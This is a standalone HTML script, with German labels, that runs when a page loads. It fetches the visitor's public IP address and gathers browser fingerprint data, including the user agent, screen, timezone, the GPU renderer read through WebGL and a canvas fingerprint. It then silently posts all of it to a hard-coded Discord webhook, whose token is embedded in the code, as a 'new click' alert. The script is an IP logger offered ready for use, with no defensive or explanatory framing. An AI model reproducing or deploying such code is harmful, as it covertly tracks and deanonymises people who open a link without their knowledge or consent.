<script>
fetch("https://api.ipify.org?format=json")
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;
    const browser = navigator.userAgent;
    const platform = navigator.platform;
    const zeitstempel = new Date().toLocaleString("de-DE");

    const aufloesung = `${screen.width}x${screen.height}`;
    const farbtiefe = screen.colorDepth;
    const sprache = navigator.language;
    const zeitzone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const cookiesAktiv = navigator.cookieEnabled ? "Ja" : "Nein";
    const touch = navigator.maxTouchPoints > 0 ? "Ja" : "Nein";
    const online = navigator.onLine ? "Ja" : "Nein";

    // GPU Info (sicher abgefangen)
    let gpuInfo = "Nicht verfügbar";
    try {
      const canvasGL = document.createElement('canvas');
      const gl = canvasGL.getContext('webgl') || canvasGL.getContext('experimental-webgl');
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        gpuInfo = `${vendor} / ${renderer}`;
      }
    } catch (e) {
      gpuInfo = "Fehler bei Abfrage";
    }

    // Canvas Fingerprint
    let canvasFP = "Nicht verfügbar";
    try {
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "14px Arial";
      ctx.fillText("Fingerprint Test", 2, 2);
      canvasFP = canvas.toDataURL().slice(0, 100); // gekürzt
    } catch (e) {
      canvasFP = "Fehler";
    }

    const webhookUrl = "https://discord.com/api/webhooks/1394554954391355492/comU-mif2egSzF70Vx8BIyBr0yH4y2MuUOjbSKYql6As7GIu9kTxiIkZwv0xeJMOA1jI";

    const payload = {
      content: `# 📨 NEUER KLICK

**📌 IP:** \`${ip}\`
**🌐 Browser:** ${browser}
**💻 Plattform:** ${platform}
**🖥️ Auflösung:** ${aufloesung}
**🌈 Farbtiefe:** ${farbtiefe}
**🗣️ Sprache:** ${sprache}
**🌍 Zeitzone:** ${zeitzone}
**🍪 Cookies aktiv:** ${cookiesAktiv}
**📶 Online:** ${online}
**🤳 Touch:** ${touch}
**🧠 GPU Info:** ${gpuInfo}
**🖼️ Canvas-Fingerprint:** \`${canvasFP}\`
**⏰ Zeitpunkt:** ${zeitstempel}
🔗 <https://whatismyipaddress.com/ip/${ip}>`
    };

    fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    }).catch(err => {
      console.error("Fehler beim Senden an Discord:", err);
    });
  })
  .catch(err => {
    console.error("Fehler beim Abrufen der IP-Adresse:", err);
  });
</script>
